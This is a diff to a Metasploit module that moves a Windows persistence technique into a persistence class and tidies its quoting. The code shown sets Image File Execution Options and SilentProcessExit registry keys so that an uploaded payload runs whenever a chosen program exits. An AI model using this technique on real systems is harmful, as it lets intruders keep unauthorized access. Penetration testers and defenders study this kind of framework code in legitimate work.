@@ -3,13 +3,15 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class MetasploitModule < Msf::Exploit::Local
+class MetasploitModule < Msf::Persistence
   Rank = ExcellentRanking
 
   include Msf::Post::Windows::Registry
   include Msf::Post::File
   include Msf::Exploit::EXE
   include Msf::Post::Windows::Priv
+  include Msf::Exploit::Deprecated
+  moved_from 'exploits/windows/local/persistence_image_exec_options'
 
   def initialize(info = {})
     super(
@@ -66,7 +68,7 @@ class MetasploitModule < Msf::Exploit::Local
 
   def validate_active_host
     unless is_system?
-      fail_with(Failure::NoAccess, "You must be System to run this Module")
+      fail_with(Failure::NoAccess, 'You must be System to run this Module')
     end
 
     begin
@@ -80,18 +82,18 @@ class MetasploitModule < Msf::Exploit::Local
   def write_reg_keys(image_file, payload_pathname)
     reg_keys = []
     reg_keys.push(key_name: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{image_file}",
-                  value_name: "GlobalFlag",
-                  type: "REG_DWORD",
+                  value_name: 'GlobalFlag',
+                  type: 'REG_DWORD',
                   value_value: 512)
     reg_keys.push(key_name: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{image_file}",
-                  value_name: "ReportingMode",
-                  type: "REG_DWORD",
+                  value_name: 'ReportingMode',
+                  type: 'REG_DWORD',
                   value_value: 1)
     reg_keys.push(key_name: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{image_file}",
-                  value_name: "MonitorProcess",
-                  type: "REG_SZ",
+                  value_name: 'MonitorProcess',
+                  type: 'REG_SZ',
                   value_value: payload_pathname)
-    silent_process_exit_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"
+    silent_process_exit_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit'
     registry_createkey(silent_process_exit_key) unless registry_key_exist?(silent_process_exit_key)
     reg_keys.each do |key|
       registry_createkey(key[:key_name]) unless registry_key_exist?(key[:key_name])
@@ -106,10 +108,10 @@ class MetasploitModule < Msf::Exploit::Local
 
   def exploit
     validate_active_host
-    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
+    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
     temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
     image_file = datastore['IMAGE_FILE']
-    payload_pathname = temp_path + "\\" + payload_name + '.exe'
+    payload_pathname = temp_path + '\\' + payload_name + '.exe'
     vprint_status("Payload pathname = #{payload_pathname}")
     upload_payload(payload_pathname) if write_reg_keys(image_file, payload_pathname)
   end
